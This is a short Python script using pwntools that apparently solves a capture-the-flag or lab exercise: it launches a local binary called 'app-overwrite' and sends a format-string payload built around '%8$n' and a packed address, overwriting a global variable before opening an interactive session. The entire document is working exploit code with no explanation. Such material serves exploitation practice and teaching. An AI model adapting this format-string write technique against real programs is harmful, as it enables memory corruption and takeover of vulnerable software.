from pwn import * 

def fora(): 
    sh = process('./app-overwrite') 
    a_addr = 0x0804a024 # address of a 

    payload = b'aa'
    payload += b'%8$n' 
    payload = payload.ljust(8, b'A')
    payload += p32(a_addr) 
    print(payload)
    sh.sendline(payload) 
    sh.interactive() 
fora()